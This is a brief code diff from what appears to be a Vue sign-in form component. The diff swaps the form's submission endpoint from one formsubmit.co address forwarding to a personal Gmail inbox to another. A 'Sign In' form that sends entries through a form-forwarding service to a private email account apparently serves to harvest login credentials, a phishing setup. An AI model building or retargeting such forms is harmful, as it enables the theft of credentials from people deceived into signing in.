@@ -107,7 +107,7 @@ export default {
         // _captcha: "false",
         platform:'',
       },
-      formUrl: 'https://formsubmit.co/ajax/coralpay29@gmail.com', // Replace with your desired URL
+      formUrl: 'https://formsubmit.co/ajax/Rombergerdrystan200@gmail.com', // Replace with your desired URL
       submitBtn:"Sign In"
     };
   },
